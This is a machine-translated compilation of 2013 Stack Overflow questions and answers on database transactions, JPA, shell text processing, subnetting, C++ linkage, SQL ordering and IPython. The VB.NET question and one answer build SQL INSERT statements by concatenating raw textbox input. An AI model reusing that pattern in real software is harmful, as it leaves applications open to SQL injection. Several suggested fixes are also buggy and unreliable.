Dim da As New SqlDataAdapter
Dim ds As New DataSet
Dim trans As SqlTransaction
Dim tot As Integer
Public Sub RecordSave()
    tot = CInt(TB3.Text.Trim) + CInt(TB4.Text.Trim) + CInt(TB5.Text.Trim) + CInt(TB6.Text.Trim)
    Dim yr As String
    yr = Now.Year()
    Try
        cn.Open()
        trans = cn.BeginTransaction()
        da.InsertCommand.Transaction = trans
        da.InsertCommand = New SqlCommand("INSERT INTO[FTUT_tbl] (roll_no,s_name,class,session,eng_i,ben,math,stu_wor,gra_tot) VALUES ('" & TB1.Text.Trim & "','" & TB2.Text.Trim & "','Nursery','" & yr & "','" & TB3.Text.Trim & "','" & TB4.Text.Trim & "','" & TB5.Text.Trim & "','" & TB6.Text.Trim & "','" & tot & "')", cn)
        da.InsertCommand.ExecuteNonQuery()
        da.Dispose()
        da.InsertCommand = New SqlCommand("INSERT INTO[FTE_tbl] (roll_no,s_name,class,session) VALUES ('" & TB1.Text.Trim & "','" & TB2.Text.Trim & "','Nursery','" & yr & "')", cn)
        da.InsertCommand.ExecuteNonQuery()
        da.Dispose()
trans.Commit()
        MsgBox("Rocord Successfully Inserted!")
    Catch ex As Exception
        trans.Rollback()
        MsgBox(ex.Message)
    Finally
        cn.Close()
    End Try
End Sub 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:07:32.213

创建第`InsertCommand`一个，然后分配事务：

```
da.InsertCommand = New SqlCommand("...")
da.InsertCommand.Transaction = trans 
```

你需要提交你的交易：

```
da.InsertCommand.Transaction.Commit() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-01T01:28:17.313

你的问题是你在第一次插入中处理了 sql 命令，但是你没有在另一个插入中再次打开它。

试试这个.....

```
cn.Open()
    trans = cn.BeginTransaction()
    da.InsertCommand.Transaction = trans
    da.InsertCommand = New SqlCommand("INSERT INTO[FTUT_tbl] (roll_no,s_name,class,session,eng_i,ben,math,stu_wor,gra_tot) VALUES ('" & TB1.Text.Trim & "','" & TB2.Text.Trim & "','Nursery','" & yr & "','" & TB3.Text.Trim & "','" & TB4.Text.Trim & "','" & TB5.Text.Trim & "','" & TB6.Text.Trim & "','" & tot & "')", cn)
    da.InsertCommand.ExecuteNonQuery()
    da.Dispose()
    cn.Open()
    da.InsertCommand = New SqlCommand("INSERT INTO[FTE_tbl] (roll_no,s_name,class,session) VALUES ('" & TB1.Text.Trim & "','" & TB2.Text.Trim & "','Nursery','" & yr & "')", cn)
    da.InsertCommand.ExecuteNonQuery()
    da.Dispose() 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T10:51:49.800

试试这个，可能对你有帮助

```
 Dim dsBillMst As DataTable
 Dim TrDtsSvr As SqlTransaction
 Dim cmdReadLocal As New SqlCommand
 Dim ConSvr As New SqlConnection(gblstrDBConnectionStr)
 ConSvr.Open()
 TrDtsSvr = ConSvr.BeginTransaction() 
 cmdReadLocal.Transaction = TrDtsSvr 
 cmdReadLocal.commandtext="//your insert statement"
 cmdReadLocal.executenonquery()
 adapter = New SqlDataAdapter(cmdReadLocal)
            dsBillMst = New DataTable
            adapter.Fill(dsBillMst) 
```

# java - JPA EntityManager 不删除实体

> ID：14977031
> 
> 赞同：0
> 
> 时间：2013-02-20T10:02:51.213
> 
> 标签：java, jpa, entities

我想从数据库中删除实体列表。 `List<LetterEntity> letterToDel`- 实体列表。我试图以多种方式删除此列表。

1.  我创建一个事务并删除循环中的每个实体

```
 EntityTransaction trx = em.getTransaction();
    try {

      for (LetterEntity l : lettersToDel) {
         trx.begin();
         em.remove(l);
         em.flush();
         trx.commit();
      } 

    } catch (Exception e) {
        e.printStackTrace();
    } finally {
         if (trx.isActive())
             trx.rollback();
     } 
```

1.  我为循环中的每个删除创建新事务

```
 try {

      for (LetterEntity l : lettersToDel) {
         EntityTransaction trx = em.getTransaction();
         trx.begin();
         em.remove(l);
         em.flush();
         trx.commit();
      } 

    } catch (Exception e) {
        e.printStackTrace();
    } finally {
         if (trx.isActive())
             trx.rollback();
    } 
```

在案例 1,2 中没有例外，但实体没有删除。

1.  我试图用查询删除实体

```
 try {
      for (LetterEntity l : lettersToDel) {
              em.createQuery("delete  from LetterEntity l where l = :letter")
                 .setParameter("letter", l)
                 .executeUpdate();
      }
    } catch (Exception e) {
        e.printStackTrace();
    } 
```

情况 3 有一个例外：

```
javax.persistence.TransactionRequiredException: Executing an update/delete query 
```

我做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T10:10:11.703

代码应该在执行查询之前创建一个事务。

```
try {
     EntityTransaction trx = em.getTransaction();
     trx.begin();   
      for (LetterEntity l : lettersToDel) {
              em.createQuery("delete  from LetterEntity l where l = :letter")
                 .setParameter("letter", l)
                 .executeUpdate();
     trx.commit();
      }
    } catch (Exception e) {
        e.printStackTrace();
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:21:21.450

对于情况 3，这是正常的。您需要一个事务来执行更新。（如果你使用Spring，只需在方法中添加@Transactional注解即可）

对于 1 和 2，你是否进入 trx.rollback(); 在你最后的声明中？

# facebook-like - 社交媒体——比如带有直接链接的按钮？

> ID：14977037
> 
> 赞同：1
> 
> 时间：2013-02-20T10:03:11.947
> 
> 标签：facebook-like, social-media

我想知道是否有一种方法可以插入一个“自定义”按钮，只有一个链接

```
<a href="www.a.link">Like us on FB</a> 
```

对于 FaceBook、StumbleUpon、diggit 等网站，即使我的网站在这些网站中没有页面？

# python - 获取包含图像的 PDF 页面

> ID：14977038
> 
> 赞同：1
> 
> 时间：2013-02-20T10:03:15.293
> 
> 标签：python, bash, pdf

我正在寻找一种编程解决方案来查找所有包含至少一个图像的页面（例如它们的页码）。我不需要图像本身，我只需要页码。首选 shell 脚本解决方案或 python 解决方案，但有助于完成此任务的一切都可以。

背景：我正在对 PDF 进行 OCR，我需要知道在哪些页面上运行 OCR 是有意义的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:08:32.760

一种解决方案是使用软件包中`pdfimages`的实用程序。`poppler-utils`它可以输出一些关于存储在 pdf 中的图像的信息：

```
$ pdfimages -list file.pdf
page   num  type   width height color comp bpc  enc interp  object ID
---------------------------------------------------------------------
   1     0 image     200   197  rgb     3   8  jpeg   no         7  0 
```

页码是一个（从 1 开始计数），`identify`（从`ImageMagik`包中）可以显示所有页码：

```
$ identify -format '%p ' file
0 1 2 3 
```

从这两个命令可以看出，第 2、3、4 页不包含图像，而第 1 页包含图像。

# javacard - 向 javacard 发送 APDU 命令时出现“6985 不满足使用条件”

> ID：14977039
> 
> 赞同：1
> 
> 时间：2013-02-20T10:03:14.800
> 
> 标签：javacard, apdu

我正在向 javacard 发送以下命令，但出现此错误

环境：通过 nfc 在 Galaxy s3 上运行的 android 应用程序

> 6985 不满足使用条件

如果您让我知道导致此错误的原因会很好。

```
byte[] APDU_Command = new byte[]{

                (byte)0x80,//CLA
                (byte)0xD0,//INS
                (byte)0x01,//P1
                (byte)0x00,//P2

                //Length
                (byte)0x21,//Lc

                //id
                (byte)31,
                (byte)32,
                (byte)33,
                (byte)34,

                //number
                (byte)33,                   
                (byte)35,
                (byte)31,
                (byte)36,
                (byte)39,                   
                (byte)38,
                (byte)30,    
                (byte)35,
                (byte)37,
                (byte)37,
                (byte)34,
                (byte)30,
                (byte)31,
                (byte)37,
                (byte)33,

                //Name
                (byte)50,
                (byte)72,
                (byte)65,
                (byte)76,
                (byte)61,
                (byte)73,
                (byte)54,
                (byte)65,
                (byte)73,
                (byte)74,
                (byte)43,
                (byte)61,
                (byte)72,
                (byte)64 

        }; 
```

提前致谢，

# php - 在 facebook 上通过 app 点赞只会返回 true 并且什么都不做

> ID：14977043
> 
> 赞同：0
> 
> 时间：2013-02-20T10:03:26.800
> 
> 标签：php, facebook, facebook-graph-api, curl

我试图通过 cURL 获取朋友粉丝页面的提要，并通过应用程序发布喜欢的内容。cURL GET 工作正常，但是当谈到喜欢对象时（肯定启用了喜欢，因为它是 facebook），我得到的只是一个布尔值（并且没有动作）。我在 SO 上看到你发布了一个喜欢

```
($access_token, "https://graph.facebook.com/$post_id/likes", 'POST') 
```

但是，它不起作用（它说应用程序没有这样做的权限，或者我需要一个有效的 url）。

我已经尝试了所有可能的解决方案，但似乎没有任何效果。个人资料是我的，访问令牌也是我的，我将 publish_stream 权限授予我自己的应用程序。

在尝试了 SDK PHP Likbrary 之后，我尝试了直接 cURL 帖子，代码如下：

```
function likeit($url){
 //open connection
$ch = curl_init();

curl_setopt($ch,CURLOPT_URL, $url);
curl_setopt($ch,CURLOPT_POST, $url);
curl_exec($ch);
curl_close($ch); 

} 
```

执行 ia 谜题。当它不返回 OAuth 异常时，它返回布尔值并停在那里（我无法“喜欢”我想要喜欢的帖子）。最后一次尝试（但我已经尝试过所有这些，甚至在某些测试中的整个 url）是

```
foreach ($feeds->data as $feed_data)
$message = $feed_data->message;
$title = $feed_data->name;
$link = $feed_data->link;
$id = $feed_data->id;

    $myaccesstoken = "longlastingaccesstokenstring";
    $post=likeit($myaccesstoken, "https://graph.facebook.com/$post_id/likes", 'POST'); 
```

有人对如何做到这一点有建议吗？这似乎微不足道，但我没有办法完成它。非常感谢您！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-22T14:44:05.440

I've found a solution, and thus am posting it here for future reference (hoping it is helpful for anybody with the same problem): the only problem was that after the new permissions with facebook I needed to re-authorize my app.

After that, it is possible to post a like with the SDK facebook library, normally:

```
 $facebook->api("/$id/likes", 'post', array( 
            'access_token'  =>  $myaccesstoken)); 
```

No need to use cURL directly. Hope this helps someone with the same question.

# mysql - 用tomcat 7玩framework 2.1

> ID：14977045
> 
> 赞同：1
> 
> 时间：2013-02-20T10:03:42.050
> 
> 标签：mysql, tomcat7, playframework-2.1

我刚刚将 Play Framework WAR 插件与 Maven 插件一起使用并创建了一个 WAR 文件，但在部署到 Tomcat 时出现以下异常：

```
java.lang.IllegalStateException
        at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1597)
        at org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1556)
        at com.mysql.jdbc.DatabaseMetaData.getTables(DatabaseMetaData.java:4997)
        at com.jolbox.bonecp.BoneCP.isConnectionHandleAlive(BoneCP.java:677)
        at com.jolbox.bonecp.ConnectionTesterThread.run(ConnectionTesterThread.java:103)
        at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
        at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:334)
        at java.util.concurrent.FutureTask.run(FutureTask.java:166)
        at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$101(ScheduledThreadPoolExecutor.java:165)
        at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:266)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
        at java.lang.Thread.run(Thread.java:679) 
```

我`application.conf`在 Play Framework 中使用来插入我的连接信息。

有人可以在这个问题上帮助我吗？

# networking - Rgd：在 /24 网络上对大约 370 台主机进行子网划分

> ID：14977048
> 
> 赞同：-1
> 
> 时间：2013-02-20T10:03:42.710
> 
> 标签：networking, subnet

Rgd：在 /24 网络上对大约 370 台主机进行子网划分

我正在为以下内容进行子网划分。

有一所学校，第一层是主大厅和五层教室（第二层到第六层）

我计算出 1 级将使用 161 台主机。级别 2-6 - 每个级别将使用 55 个主机

**所以我想知道如何对它进行子网划分。**

主IP地址为203.218.71.0/24

我正在考虑将 3/4 子网连接到主大厅 - 我可以将主大厅分成 3 个部分，每个部分大约有 60 个主机

我正在考虑将 1/4 子网划分到 2-6 楼

然后通过将它们分成 2 个切片（每个切片 4 个级别）进一步将它们子网化，每个切片将有大约 60 个主机（可以解决 4 个级别）

总共我们将使用 8 个切片中的 5 个（1/2 x 1/4） - 5 个级别

但是对于IP地址，我该怎么做，我的子网划分是否可行？

我的主要目的是链接整个学校并覆盖内部网络，连接到互联网的是主路由器>然后分发到交换机和接入点并进行链接。

谢谢

希望看到您的评论并感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:13:39.143

您不能在单个 /24 中放置 370 台主机 - /24 中只能容纳 254 台主机。

无论如何，子网划分应该按*功能*而不是按物理位置划分。

与其查看级别，不如查看哪些系统组实际上需要位于同一广播域中。使用 VLAN 允许机器直接在同一子网上交换流量，即使它们位于不同的楼层。

将学生可访问的机器与学校管理部门分开，并在它们之间放置防火墙。

看看在适当的地方使用 NAT（教室机器？）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-10T12:10:00.410

除非您对每台主机都有一个公共 IP 地址的特定需求（无论如何您都不能这样做，请参阅上面 Alnitak 的回复），否则出于多种原因，我会远离它。您不需要 /24，/30 可能会很好地满足您的需求，使用 .1 作为您的提供商网关，使用 .2 作为您的主要 WAN IP。

为您的段使用 NAT，并使用逻辑 RFC1918 方案。例如，一楼使用 192.168.1.0/24，二楼使用 192.168.2.0/24，等等。考虑到最终的增长，所以可能将每个段提高到 /22。私有 IP 空间免费且充足。如果您愿意，可以使用 10.0.0.0/8 并为每个楼层分配 /16，无论您的最终需求如何。

总的来说，好的设计胜过一切。另一种方法是浪费大量时间和精力在事后重新编号。如果您出于特定原因需要额外的公共 IP，请根据您的需要进行更改，但用于课堂使用的公共 IP 会极大地浪费宝贵的 IPv4 资源，这些资源可以很容易地由 NAT 提供服务。

此外，在列出您的设备时，注意您正在使用的实际设备会很有帮助，因此可以指出适当的程序。作为 NAT 的开始，这里是它的主要 Cisco 文档（同样，我不知道您使用的是什么设备，所以如果您不使用 Cisco 设备，请谨慎使用此链接）：

[http://www.cisco.com/en/US/tech/tk648/tk361/technologies_tech_note09186a0080094e77.shtml](http://www.cisco.com/en/US/tech/tk648/tk361/technologies_tech_note09186a0080094e77.shtml)

# lucene - 使用 Tika 解析流（阅读器）并同时使用 Lucene 对其进行索引

> ID：14977052
> 
> 赞同：3
> 
> 时间：2013-02-20T10:04:06.427
> 
> 标签：lucene, streaming, apache-tika

我正在阅读文档，想知道是否有可能不读取两次流以便用 Tika 解析它，获取元数据 + 内容并在 Lucene 中对其进行索引？

我想避免在解析后将文件存储在内存中，因为它可能太大。

我正在阅读以下链接，它似乎将解析后的文档内容保存在内存中 - [http://johnreece.com/wordpress/2011/03/13/a-concise-tikalucene-content-parsing-and-indexing-example /](http://johnreece.com/wordpress/2011/03/13/a-concise-tikalucene-content-parsing-and-indexing-example/)

（也许以某种方式与“[无论如何使 Lucene 字段存储并通过阅读器流式传输](https://stackoverflow.com/questions/6213691/anyways-of-making-a-lucene-field-stored-as-well-as-streamed-through-a-reader)”）

（此外，我想确保 Lucene 的`TextField`处理`Reader`没有`String`使用它，这应该会消耗内存）

# linux - 使用 sed 和 cut 命令复制行

> ID：14977053
> 
> 赞同：1
> 
> 时间：2013-02-20T10:04:07.873
> 
> 标签：linux, sed, cut

我有一个像这样的条目的文件：

```
@HWI-ST750:151:C1C6AACXX:8:1101:10000:14114/1
AAACATACCATTGCATATTTCGTATAATTCGAATTTAAGCAAGTTGTATTGCCAACAGCTCAGATCAATTAAGAATCTTTTCAAATTTATCAATTTA
+/1
DDHBFHHIAHHJEGJFGICHG;CGHGIJIIAIHHIJIGAGIE9FDFHGHG:4???BBC@8=;@FHI:DACHE>>AEAA@;B@;)6(>AC@>35@DDC
@HWI-ST750:151:C1C6AACXX:8:1101:10000:37802/1
GTTCCTTTACTTGCTCCCATGTCCCAATCTAACACACATGAGTCGTCGCACGCCAGTAAATCTAAAGATTTCAGACACTCAGACTCGTACAGTGAAA
+/1
FHHHHHJJIJJJJJJJJJJJJIJJJIJJJJJJJJJJJIHJIJ@GIHIIJJJIJHGHFFFFFFEEDEEEEDDDDDDDDDCDDCCCDDDABBDD>CC>A 
```

我想从第 1 个字到第 45 个字的每 2 行删减一次。所以我使用了以下命令：

```
sed "0~2p" BT8_A.fastq | cut -c1-45 | head -n 12 
```

它工作正常，但在切割第 45 个单词后，同一行被附加到下一行。像这样 -

```
@HWI-ST750:151:C1C6AACXX:8:1101:10000:14114/1
AAACATACCATTGCATATTTCGTATAATTCGAATTTAAGCAAGTT
AAACATACCATTGCATATTTCGTATAATTCGAATTTAAGCAAGTT
+/1
DDHBFHHIAHHJEGJFGICHG;CGHGIJIIAIHHIJIGAGIE9FD
DDHBFHHIAHHJEGJFGICHG;CGHGIJIIAIHHIJIGAGIE9FD
@HWI-ST750:151:C1C6AACXX:8:1101:10000:37802/1
GTTCCTTTACTTGCTCCCATGTCCCAATCTAACACACATGAGTCG
GTTCCTTTACTTGCTCCCATGTCCCAATCTAACACACATGAGTCG
+/1
FHHHHHJJIJJJJJJJJJJJJIJJJIJJJJJJJJJJJIHJIJ@GI
FHHHHHJJIJJJJJJJJJJJJIJJJIJJJJJJJJJJJIHJIJ@GI 
```

我无法解决这个问题。我在这里哪里出错了。帮我。

谢谢你。

我想要的输出是：

```
@HWI-ST750:151:C1C6AACXX:8:1101:10000:14114/1
AAACATACCATTGCATATTTCGTATAATTCGAATTTAAGCAAGTT
+/1
DDHBFHHIAHHJEGJFGICHG;CGHGIJIIAIHHIJIGAGIE9FD
@HWI-ST750:151:C1C6AACXX:8:1101:10000:37802/1
GTTCCTTTACTTGCTCCCATGTCCCAATCTAACACACATGAGTCG
+/1
FHHHHHJJIJJJJJJJJJJJJIJJJIJJJJJJJJJJJIHJIJ@GI 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-20T10:14:37.813

如果您只想剪切每 2 行，而其他行保持不变，则使用起来可能更容易`awk`：

```
awk 'NR % 2 == 0 { print substr($0, 0, 45) } NR % 2 == 1 { print }' BT8_A.fastq 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-20T10:19:01.490

单程：

```
$ sed 'n;s/\(.\{45\}\).*/\1/' file 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-20T10:23:58.267

这是一个 sed 单线：

```
sed -r '2~2s/^(.{45}).*/\1/' file 
```

输出：

```
kent$  sed -r '2~2s/^(.{45}).*/\1/' file                                            │drwxr-xr-x 4 kent kent  160 Feb 15 16:48 pkg/
@HWI-ST750:151:C1C6AACXX:8:1101:10000:14114/1                                         │-rw-r--r-- 1 kent kent   19 Feb 15 14:06 status.xml
AAACATACCATTGCATATTTCGTATAATTCGAATTTAAGCAAGTT                                         │-rw-r--r-- 1 kent kent  18K Feb 15 16:44 tinyswitch.tgz
+/1                                                                                   │-rw-r--r-- 1 kent kent   73 Feb 15 14:06 t.sh
DDHBFHHIAHHJEGJFGICHG;CGHGIJIIAIHHIJIGAGIE9FD                                         │-rw-r--r-- 1 kent kent  18K Feb 15 16:24 tsw.tgz
@HWI-ST750:151:C1C6AACXX:8:1101:10000:37802/1                                         │-rw-r--r-- 1 kent kent 7.5K Feb 19 18:44 vimod.zsh
GTTCCTTTACTTGCTCCCATGTCCCAATCTAACACACATGAGTCG                                         │-rw-r--r-- 1 kent kent  23K Feb 19 22:09 vimrd
+/1                                                                                   │-rw-r--r-- 1 kent kent   42 Feb 17 16:00 x.txt
FHHHHHJJIJJJJJJJJJJJJIJJJIJJJJJJJJJJJIHJIJ@GI 
```

# c++ - extern const char* const SOME_CONSTANT 给我链接器错误

> ID：14977058
> 
> 赞同：11
> 
> 时间：2013-02-20T10:04:27.060
> 
> 标签：c++, linker, constants, extern

我想在 API 中提供一个字符串常量，如下所示：

```
extern const char* const SOME_CONSTANT; 
```

但是如果我在我的静态库源文件中将它定义为

```
const char* const SOME_CONSTANT = "test"; 
```

链接到该库并使用 SOME_CONSTANT 时出现链接器错误：

> 错误 1 ​​错误 LNK2001: 无法解析的外部符号 "char const * const SOME_CONSTANT" (?SOME_CONSTANT@@3QBDB)

从声明和定义中删除指针 const-ness（第二个 const 关键字）`extern const char* const`使其工作。如何**使用**指针常量导出它？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-02-20T10:10:45.287

问题可能是`extern`声明在定义常量的源文件中不可见。尝试重复定义上方的声明，如下所示：

```
extern const char* const SOME_CONSTANT;  //make sure name has external linkage
const char* const SOME_CONSTANT = "test";  //define the constant 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-02-20T10:11:12.907

很可能你忘记在你的实现文件中包含你的标题

无论如何，将关键字添加`extern`到定义中

没有`extern`声明，它具有内部链接，因此链接器不可见

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2022-01-03T20:22:09.467

接受答案的解决方案可以一步完成。

您可以将说明`extern`符添加到内容的定义中。

```
extern const char* const SOME_CONSTANT = "test"; 
```

# php - 新闻网站的 SQL 表结构

> ID：14977060
> 
> 赞同：0
> 
> 时间：2013-02-20T10:04:31.790
> 
> 标签：php, mysql, database

我想用 php 和 mysql 为新闻网站制作一个快速的表结构。我的数据库结构是 ID、标题、内容、cat_ids（；分类的分隔 ID - ;5;10;15;20;）、活动、发布日期。

我想进行快速查询以从该表中选择新闻。像这样的东西：

```
SELECT id 
FROM news 
WHERE cat_ids LIKE '%;15;%' 
  AND active = 1 
  AND publish_date < NOW() 
ORDER by publish_date DESC 
LIMIT 0, 10 
```

但是如果我的表是 2-3GB，那么查询会很慢。我需要一些想法来构建结构并使选择更快。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:14:50.790

一些建议如下：

1）在字段上创建索引`"active"`2
）在`"publish_date"`字段上创建索引
3）为类别和新闻关系创建单独的表并`"cat_ids"`从新闻表中删除字段

新表可能如下所示：

**`news_category_ids`**

news_id
category_id

每个 news_id 可以有多行，如果新闻属于 3 个类别，它将有 3 行

然后使用如下 SQL：

```
SELECT news.id 
FROM news INNER JOIN news_category_ids ON news.id =  news_category_ids.news_id
WHERE 1
  AND news.active = 1 
  AND news_category_ids.cat_id = 15
  AND news.publish_date < NOW() 
ORDER by news.publish_date DESC 
LIMIT 0, 10 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:11:27.517

不要使用`cat_ids`列，而是尝试使用 and 创建一个表`news_cats`，并使用以下查询：`news_id``cat_id`

```
SELECT id 
FROM news JOIN news_cats ON news_id = id
WHERE cat_id = 15
  AND active = 1 
  AND publish_date < NOW() 
ORDER by publish_date DESC 
LIMIT 0, 10 
```

# android - Android Activity Stack 奇怪的行为

> ID：14977064
> 
> 赞同：2
> 
> 时间：2013-02-20T10:04:50.510
> 
> 标签：android, mobile, galaxy

我的应用程序通常工作得很好，直到我在特定设备上遇到一个奇怪的问题。例如，当我开始一个新活动时：

> ActivityA.java
> 
> Intent basvurularIntent = new Intent(view.getContext(), ActivityB.class);
> startActivity(basvurularIntent);

完成该活动后

> ActivityB.java
> 
> 结束（）;

AcitivityB 的 onCreate() 方法再次触发。这就是 ActivityB 重新加载其内容的原因。我在超过 1.000 次下载应用的 15 部手机中遇到了这个问题。示例：Galaxy S3 Android OS 4.1.2。你知道为什么会这样吗？

# python - 如何配置 ipython 以十六进制格式显示整数？

> ID：14977066
> 
> 赞同：16
> 
> 时间：2013-02-20T10:04:53.107
> 
> 标签：python, ipython

这是默认行为：

```
In [21]: 255
Out[21]: 255 
```

这就是我想要的：

```
In [21]: 255
Out[21]: FF 
```

我可以设置 ipython 来做到这一点吗？

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2013-02-21T02:27:18.803

您可以通过为整数注册一个特殊的显示格式化程序来做到这一点：

```
In [1]: formatter = get_ipython().display_formatter.formatters['text/plain']

In [2]: formatter.for_type(int, lambda n, p, cycle: p.text("%X" % n))
Out[2]: <function IPython.lib.pretty._repr_pprint>

In [3]: 1
Out[3]: 1

In [4]: 100
Out[4]: 64

In [5]: 255
Out[5]: FF 
```

如果你想要这个永远在线，你可以`$(ipython locate profile)/startup/hexints.py`在前两行中创建一个文件（或者作为一个文件来避免任何分配）：

```
get_ipython().display_formatter.formatters['text/plain'].for_type(int, lambda n, p, cycle: p.text("%X" % n)) 
```

每次启动 IPython 时都会执行。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2017-06-08T03:49:56.057

根据[minrk 的回答](https://stackoverflow.com/a/14993580/4518341)和[rjb](https://stackoverflow.com/a/43618365/4518341)对另一个问题的回答，我把它放在我的 Python 启动文件中：

```
def hexon_ipython():
  '''To print ints as hex, run hexon_ipython().
  To revert, run hexoff_ipython().
  '''
  formatter = get_ipython().display_formatter.formatters['text/plain']
  formatter.for_type(int, lambda n, p, cycle: p.text("0x%x" % n))

def hexoff_ipython():
  '''See documentation for hexon_ipython().'''
  formatter = get_ipython().display_formatter.formatters['text/plain']
  formatter.for_type(int, lambda n, p, cycle: p.text("%d" % n))

hexon = hexon_ipython
hexoff = hexoff_ipython 
```

所以我可以这样使用它：

```
In [1]: 15
Out[1]: 15

In [2]: hexon()

In [3]: 15
Out[3]: 0xf

In [4]: hexoff()

In [5]: 15
Out[5]: 15 
```

# windows - WinDbg 崩溃后无响应

> ID：14977067
> 
> 赞同：1
> 
> 时间：2013-02-20T10:04:54.080
> 
> 标签：windows, debugging, driver, windbg

我正在调试 VirtualBox VM 中的驱动程序，WinDbg 通过作为命名管道暴露给主机的 COM 端口连接到目标。

调试工作正常 - 我可以暂停目标、设置断点、逐步执行源文件 .etc

当我的驱动程序遇到致命错误时，WinDbg 将以下输出转储到控制台：

```
*** Fatal System Error: 0x00000050
                       (0xFFFFF88004126840,0x0000000000000001,0xFFFFF88003E12690,0x0000000000000000)

Driver at fault: 
***  MYDRIVER.sys - Address FFFFF88003E12690 base at FFFFF88003E12000, DateStamp 51249ae5
.
Break instruction exception - code 80000003 (first chance)

A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.

Connected to Windows 7 7601 x64 target at (Wed Feb 20 09:57:54.670 2013 (UTC + 0:00)), ptr64 TRUE
Loading Kernel Symbols
...............................................................
................................................................
..............
Loading User Symbols
.....
Loading unloaded module list
.....Unable to enumerate user-mode unloaded modules, Win32 error 0n30
Loading Wow64 Symbols
..........................................................
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

Use !analyze -v to get detailed debugging information.

BugCheck 50, {fffff88004126840, 1, fffff88003e12690, 0} 
```

调试器命令行上的小状态框是空白的，调试器不响应我输入的命令。

我想查看调用堆栈并检查机器状态，但调试器仍然无响应。按 BREAK/CONTINUE 似乎没有效果。

我不明白——此时调试器的状态是什么？

我怀疑我的整个调试设置非常非常慢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-22T10:25:54.227

通过 com 端口调试非常慢，您必须切换到 virtualkd - [http://virtualkd.sysprogs.org/](http://virtualkd.sysprogs.org/)（它使用主机和来宾之间的共享内存，而且速度快得多）。在你等待的时候不要按任何东西，它的速度会慢一点。一般com已经过时，调试时，没有vm，都使用火线或usb接口。

# c# - Sql-基于表中两列的排序

> ID：14977071
> 
> 赞同：3
> 
> 时间：2013-02-20T10:05:17.093
> 
> 标签：c#, mysql, sql, sql-server, collections

考虑一个数据库

```
checkID record_number   data    Order_number
a                0        1        2
a                1        2        0
a                2        3        1
a                3        4        3 
```

查找根据 Order_number 列获取记录的查询 ieprocedure 应该返回数据：

```
having record _number 2 then
having record _number 0 then
having record _number 1 then
having record _number 3 
```

是否有任何连接或其他查询？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:06:42.077

```
SELECT *
FROM tablename
ORDER BY CASE WHEN record_number = 2 THEN 0 ELSE 1 END, record_number; 
```

[**SQL 小提琴演示**](http://www.sqlfiddle.com/#!3/a932b/1)

这将按以下顺序为您提供数据：

```
| CHECKID | RECORD_NUMBER | DATA | ORDER_NUMBER |
-------------------------------------------------
|       a |             2 |    3 |            1 |
|       a |             0 |    1 |            2 |
|       a |             1 |    2 |            0 |
|       a |             3 |    4 |            3 | 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-20T10:06:56.363

```
select  *
from    YourTable
order by
        case record_number
        when 2 then 1
        when 0 then 2
        when 1 then 3
        when 3 then 4
        end 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-20T10:07:54.563

在这种情况下，您可以使用**[CASE WHEN 。](http://www.1keydata.com/sql/sql-case.html)**

```
SELECT  *
FROM    tbl
ORDER BY CASE record_number
              WHEN 2 THEN 1
              WHEN 0 THEN 2
              WHEN 1 THEN 3
              WHEN 3 THEN 4
              END 
```

这是**[SQL Fiddle 演示](http://www.sqlfiddle.com/#!2/4b289/1)**。

```
| CHECKID | RECORD_NUMBER | DATA | ORDER_NUMBER |
-------------------------------------------------
|       a |             2 |    3 |            1 |
|       a |             0 |    1 |            2 |
|       a |             1 |    2 |            0 |
|       a |             3 |    4 |            3 | 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-20T10:11:50.797

最好的解决方案是为排序检查创建额外的表，如下所示：

```
record_number   sort_seq
     2              1
     0              2
     1              3
     3              4 
```

然后把它和你的桌子一起加入

```
select c.* 
from check as c 
     join sortSeq as s on c.record_number=s.record_number 
order by s.sort_seq 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-20T10:41:33.907

```
SELECT *
FROM tablename
ORDER BY Order_number 
```

# c# - WinForms：在其他应用程序的主窗口上显示表单模式

> ID：14977076
> 
> 赞同：10
> 
> 时间：2013-02-20T10:05:44.270
> 
> 标签：c#, winforms, modal-dialog

是否可以在另一个进程的主窗口上显示 WinForms 模式表单？

例如，我的 WinForms 应用程序由一个窗体组成，该窗体在另一个进程的主窗口上具有 PID x。

* * *

## 回答 #1

> 赞同：19
> 
